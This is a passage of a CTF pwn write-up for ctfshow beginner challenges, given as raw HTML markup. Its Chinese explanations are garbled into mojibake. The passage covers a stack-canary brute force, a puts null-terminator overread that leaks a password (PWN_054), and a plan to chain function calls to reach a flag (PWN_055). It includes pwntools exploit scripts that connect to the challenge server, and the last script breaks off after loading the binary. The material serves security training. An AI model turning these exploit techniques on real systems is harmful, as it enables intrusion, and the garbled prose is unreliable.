&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;$ &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªPWN1ï¼Œèµ·åˆä¸ºç©ºå€¼ï¼Œåªè¦æ¯çˆ†ç ´å‡ºä¸€ä½æ­£ç¡®å­—èŠ‚çš„canaryå€¼ï¼Œå°±ä¼šé€šè¿‡&lt;code&gt;PWN1 += chr(k)&lt;/code&gt;è¢«å‚¨å­˜è¿›PWN1å†…ï¼Œchr(k) å°†è¿™ä¸ªæ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ï¼ˆå­—èŠ‚ï¼‰ï¼Œç”¨äºæ‹¼æ¥æµ‹è¯• payloadï¼Œçˆ†ç ´ canary çš„æ¯ä¸€ä¸ªå­—èŠ‚ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å‘é€ payload çš„æ–¹å¼ï¼ˆ&lt;code&gt;sendline&lt;/code&gt; vs &lt;code&gt;send&lt;/code&gt;ï¼‰æ˜¯å…³é”®å·®å¼‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¹‹å‰çš„é¢˜ç›®å¥½åƒå¯¹å‘é€payloadçš„å‡½æ•°å¹¶ä¸ä¸¥æ ¼è¦æ±‚ï¼Œä½†åœ¨è¿™é¢˜å°±å¿…é¡»è¦æ±‚ä¸¥æ ¼äº†ï¼Œè¦ç”¨sendå‡½æ•°ï¼Œå¦‚æœæ˜¯sendlineçš„è¯ï¼Œä¼šåœ¨payloadåé¢å¤šåŠ ä¸€ä¸ªæ¢è¡Œç¬¦\nï¼Œå› é™„åŠ æ¢è¡Œç¬¦ç ´åæ ˆå¸ƒå±€ã€‚ä¹Ÿä¼šå¯¼è‡´ä¸€ç›´å¾ªç¯çˆ†ç ´å´æœ€ç»ˆçˆ†ç ´å¤±è´¥ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_054&#34;&gt;PWN_054
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå†è¿‘ä¸€ç‚¹é è¿‘ç‚¹å¿«è¢«èåŒ–ï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_054&#34; &gt;PWN_054&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA32ï¼š&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›flagå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184.png&#34;
	width=&#34;590&#34;
	height=&#34;321&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184_hu_b895d69b1278d88a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/184_hu_af0ad798c324c942.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flagå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;441px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åˆ†æmainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183.png&#34;
	width=&#34;805&#34;
	height=&#34;875&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183_hu_363b311c3db3a1fd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/183_hu_5fefdf21f2445a5c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;92&#34;
		data-flex-basis=&#34;220px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185.png&#34;
	width=&#34;905&#34;
	height=&#34;181&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185_hu_e195608c564437ee.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/185_hu_48885fbcd406ae7d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;500&#34;
		data-flex-basis=&#34;1200px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åªè¦å¯†ç æ­£ç¡®ï¼Œè¾“å‡ºæ¬¢è¿ä¿¡æ¯ &amp;ldquo;Welcome! Here&amp;rsquo;s what you want:&amp;quot;ï¼Œç„¶åmainå°±ä¼šè°ƒç”¨flagå‡½æ•°ç›´æ¥è·å–flagå­—ç¬¦ä¸²ï¼›ä½†å¯†ç ä¸æ­£ç¡®å°±ä¼šè¾“å‡ºâ€You has been banned!â€œçš„æç¤ºã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æŸ¥çœ‹é‡è¦å‚æ•°åœ¨å †æ ˆä¸­çš„ä½ç½®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186.png&#34;
	width=&#34;690&#34;
	height=&#34;330&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186_hu_795ea6b6ed69c677.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/186_hu_2122bb21e37c902d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;s1çš„ä½ç½®&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;209&#34;
		data-flex-basis=&#34;501px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187.png&#34;
	width=&#34;700&#34;
	height=&#34;186&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187_hu_7013ac1e226ae9f1.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/187_hu_521b1f3a40a7e064.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;sçš„ä½ç½®&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;376&#34;
		data-flex-basis=&#34;903px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188.png&#34;
	width=&#34;783&#34;
	height=&#34;194&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188_hu_ebffdbad06ebce9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/188_hu_fda5205a3e5b8428.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;v5çš„ä½ç½®&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;403&#34;
		data-flex-basis=&#34;968px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä»v5å’Œsçš„ä½ç½®æ¥çœ‹ï¼Œå®ƒä¿©æ‰€å¤„çš„æ ˆä½ç½®è·ç¦»æ¯”è¾ƒè¿‘æ¬¸ï¼0x160 - 0x60 = 0x100ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189.png&#34;
	width=&#34;761&#34;
	height=&#34;178&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189_hu_821da6a52c323ada.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/189_hu_47c25130beef317d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°çš„æ•°ç»„&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;427&#34;
		data-flex-basis=&#34;1026px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„v5æ•°ç»„çš„å®¹é‡åˆšå¥½0x100å¯ä»¥å¡«æ»¡ï¼Œè¿™ä¸æ˜¯å·§åˆï¼Œçªç ´ç‚¹å°±åœ¨è¿™çš„ã€‚å½“ä½ ç”¨0x100å¡«æ»¡v5åï¼Œæ­£å¥½æŠŠputsçš„ç»ˆæ­¢ç¬¦**&lt;code&gt;\x00&lt;/code&gt;**ç»™ç ´åäº†ï¼Œè¿™å°±ä¼šå¯¼è‡´putsç»§ç»­æ‰§è¡Œï¼Œç›´æ¥æŠŠsä¸€èµ·è¾“å‡ºäº†ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;h4 id=&#34;æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦-x00-å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨&#34;&gt;&lt;strong&gt;æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦ \x00 å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨ï¼Ÿ&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;çœ‹ â€œæ•°ç»„å®¹é‡â€ ä¸ â€œå­—ç¬¦ä¸²æœ€å¤§é•¿åº¦â€ çš„å…³ç³»ï¼šè‹¥æ•°ç»„å®¹é‡ &amp;gt; å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦ï¼Œç»ˆæ­¢ç¬¦å¿…åœ¨æ•°ç»„å†…éƒ¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v5&lt;/code&gt; æ•°ç»„å®¹é‡ä¸º &lt;code&gt;256&lt;/code&gt; å­—èŠ‚ï¼ˆ&lt;code&gt;0x100&lt;/code&gt;ï¼‰ï¼Œè€Œè¯»å–ç”¨æˆ·åçš„ &lt;code&gt;fgets(v5, 256, stdin)&lt;/code&gt; æœ€å¤šè¯»å– &lt;code&gt;255&lt;/code&gt; å­—èŠ‚ï¼ˆç•™ &lt;code&gt;1&lt;/code&gt; å­—èŠ‚è‡ªåŠ¨è¡¥ &lt;code&gt;\x00&lt;/code&gt;ï¼‰&lt;/p&gt;
&lt;p&gt;åˆ¤æ–­ &lt;code&gt;\x00&lt;/code&gt; æ˜¯å¦å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨ï¼Œå¯æŒ‰ä¼˜å…ˆçº§ä¾æ¬¡éªŒè¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¼˜å…ˆçœ‹ &lt;strong&gt;æ•°ç»„å®¹é‡ä¸å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦çš„å…³ç³»&lt;/strong&gt;ï¼ˆæœ€ç›´æ¥ï¼Œå¦‚ &lt;code&gt;æ•°ç»„å®¹é‡ &amp;gt; æœ€å¤§è¯»å–é•¿åº¦&lt;/code&gt;ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;å†çœ‹ &lt;strong&gt;å­—ç¬¦ä¸²çš„ç”Ÿæˆ / å¤„ç†å‡½æ•°&lt;/strong&gt;ï¼ˆå¦‚ &lt;code&gt;fgets&lt;/code&gt; è‡ªåŠ¨è¡¥ &lt;code&gt;\x00&lt;/code&gt;ã€&lt;code&gt;strchr&lt;/code&gt; æ›¿æ¢ç”Ÿæˆ &lt;code&gt;\x00&lt;/code&gt;ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;æœ€åçœ‹ &lt;strong&gt;åç»­å­—ç¬¦ä¸²æ“ä½œæ˜¯å¦æ­£å¸¸&lt;/strong&gt;ï¼ˆåå‘éªŒè¯ &lt;code&gt;\x00&lt;/code&gt; ä½ç½®åˆæ³•ï¼‰ã€‚
ä¸‰è€…å‡æŒ‡å‘ &lt;code&gt;\x00&lt;/code&gt; åœ¨æ•°ç»„å†…éƒ¨æ—¶ï¼Œå³å¯ç¡®å®šè¯¥ç»“è®ºã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;exp1ï¼Œå¾—å‡ºå¯†ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28246&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190.png&#34;
	width=&#34;1246&#34;
	height=&#34;605&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190_hu_731abf12cc5b5291.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/190_hu_2e056237ce9f9a7e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;205&#34;
		data-flex-basis=&#34;494px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ•´ä¸²å¤åˆ¶ï¼Œä¸è¦åªå¤åˆ¶h3r3ï¼ï¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191.png&#34;
	width=&#34;911&#34;
	height=&#34;265&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191_hu_e547faac653efd85.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/191_hu_25c355aad2f46d16.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;343&#34;
		data-flex-basis=&#34;825px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_055&#34;&gt;PWN_055
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šä½ æ˜¯æˆ‘çš„è°ï¼Œæˆ‘çš„æˆ‘æ˜¯ä½ çš„è°ï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_055&#34; &gt;PWN_055&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDAï¼Œè·Ÿè¿›mainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192.png&#34;
	width=&#34;574&#34;
	height=&#34;175&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192_hu_3aea53581e3b75b1.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/192_hu_fa6b794185a6065d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;328&#34;
		data-flex-basis=&#34;787px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›flagå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193.png&#34;
	width=&#34;721&#34;
	height=&#34;410&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193_hu_f36baeb593fad0dc.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/193_hu_8c0ef1ce3d1b80ba.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flagå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;422px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¦æƒ³flagå­—ç¬¦ä¸²è¢«æ‰“å°å‡ºæ¥ï¼Œå°±è¦æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼š&lt;code&gt;flag1 &amp;amp;&amp;amp; flag2 &amp;amp;&amp;amp; a1 == 0xBDBDBDBD&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;flag1ã€flag2é¡»ä¸ºçœŸå€¼ï¼Œè€Œa1è¦ç­‰äº0xBDBDBDBDå°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åˆ†åˆ«è·Ÿè¿›flag_func1ã€flag_func2å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194.png&#34;
	width=&#34;591&#34;
	height=&#34;169&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194_hu_dc3ce0ea6cd05759.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/194_hu_99eba6d139b5b18d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flag_func1å‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;349&#34;
		data-flex-basis=&#34;839px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195.png&#34;
	width=&#34;756&#34;
	height=&#34;384&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195_hu_3695df074b52678a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/195_hu_abb073b85e1de91a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flag_func2å‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;196&#34;
		data-flex-basis=&#34;472px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¤§è‡´æ€è·¯å°±æ˜¯ï¼šå…ˆè°ƒç”¨flag_func1å‡½æ•°ï¼Œä½¿flag1ç­‰äº1ï¼Œå†è°ƒç”¨flag_func2å‡½æ•°ï¼Œæ»¡è¶³å‡½æ•°æ¡ä»¶å°†flag2èµ‹å€¼ä¸º1ï¼Œæœ€åå†è°ƒç”¨flagå‡½æ•°ï¼Œç»™å‚æ•°ï¼Œæœ€ç»ˆæ‰“å°flagå­—ç¬¦ä¸²ï¼Œexpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
